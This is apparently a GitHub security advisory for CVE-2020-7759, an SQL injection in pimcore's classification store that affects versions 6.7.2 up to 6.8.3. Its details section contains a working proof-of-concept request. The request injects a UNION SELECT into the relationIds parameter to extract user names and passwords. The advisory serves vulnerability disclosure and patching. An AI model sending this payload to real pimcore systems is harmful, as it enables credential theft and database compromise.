# [H] SQL Injection in pimcore

## Summary
Severity: High
Advisory: GHSA-8jmh-c6vr-pmvm
CVE: CVE-2020-7759
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2021-05-06
Source: https://github.com/advisories/GHSA-8jmh-c6vr-pmvm
Type: github-advisory

## Affected
- Packagist: `pimcore/pimcore` — affected >=6.7.2 <6.8.3

## Details
"The package pimcore/pimcore from 6.7.2 and before 6.8.3 are vulnerable to SQL Injection in data classification functionality in ClassificationstoreController. This can be exploited by sending a specifically-crafted input in the relationIds parameter as demonstrated by the following request: http://vulnerable.pimcore.example/admin/classificationstore/relations?relationIds=[{"keyId"%3a"''","groupId"%3a"'asd'))+or+1%3d1+union+(select+1,2,3,4,5,6,name,8,password,'',11,12,'',14+from+users)+--+"}]"

## References
- https://nvd.nist.gov/vuln/detail/CVE-2020-7759
- https://github.com/pimcore/pimcore/pull/7315
- https://snyk.io/vuln/SNYK-PHP-PIMCOREPIMCORE-1017405
